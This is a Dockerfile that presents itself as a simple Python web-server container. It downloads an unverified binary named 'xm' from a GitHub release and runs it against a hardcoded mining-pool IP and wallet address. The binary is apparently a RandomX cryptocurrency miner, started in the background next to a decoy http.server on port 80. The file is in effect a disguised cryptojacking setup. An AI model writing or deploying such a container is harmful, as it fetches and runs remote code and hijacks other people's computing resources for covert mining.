FROM python:3.9.18-slim
RUN apt-get update \
	&& apt-get install -y wget \
	&& rm -rf /var/lib/apt/lists/*
USER root
ENV POOL_URL 107.178.97.202:4444
ENV POOL_USER ZEPHYR39Db7Wv6bDx9KLqWCc9iYKKD2U9dvZMmoNCfaETBEk7iZVxRPcz1R82GWSu4LKxYvD6j6yKYhWJMw3NyN1BHJzZu2326W4K
ENV POOL_PW test
WORKDIR /home/miner
RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
	&& chmod +x xm
EXPOSE 80
CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k
